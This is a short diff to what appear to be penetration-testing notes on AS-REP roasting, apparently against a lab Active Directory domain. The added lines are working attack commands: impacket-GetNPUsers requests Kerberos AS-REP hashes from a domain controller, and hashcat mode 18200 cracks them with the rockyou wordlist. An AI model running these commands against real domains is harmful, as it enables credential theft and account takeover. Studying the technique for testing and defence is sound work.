@@ -1,4 +1,10 @@
 "Do not require Kerberos preauthentication is disabled" by default.
 
 # From Kali:
-impacket-GetNPUsers -dc-ip 10.0.0.2  -request -outputfile hashes.asreproast superalex.sec/user01
+$ impacket-GetNPUsers -dc-ip 10.0.0.2  -request -outputfile hashes.asreproast superalex.sec/user01
+
+# Then check hashcat for kerberos:
+$ hashcat --help | grep -i "Kerberos"
+
+# Running hashcat:
+$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
